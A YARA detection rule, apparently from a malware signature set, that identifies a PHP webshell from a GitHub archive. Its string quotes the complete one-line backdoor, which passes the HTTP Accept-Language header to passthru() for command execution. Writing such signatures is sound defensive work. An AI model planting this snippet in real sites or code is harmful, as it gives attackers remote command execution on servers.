rule WebShell_BackDoor_Unlimit_Webshell_Accept_Language_A_1491 {
  meta:
    author = "Spider"
    comment = "None"
    date = "None"
    description = "PHP Webshells Github Archive - file accept_language.php"
    family = "Webshell"
    hacker = "None"
    hash = "180b13576f8a5407ab3325671b63750adbcb62c9"
    judge = "unknown"
    reference = "None"
    threatname = "WebShell[BackDoor]/Unlimit.Webshell.Accept.Language.A"
    threattype = "BackDoor"
  strings:
    $s0 = "<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>" fullword
  condition:
    all of them
}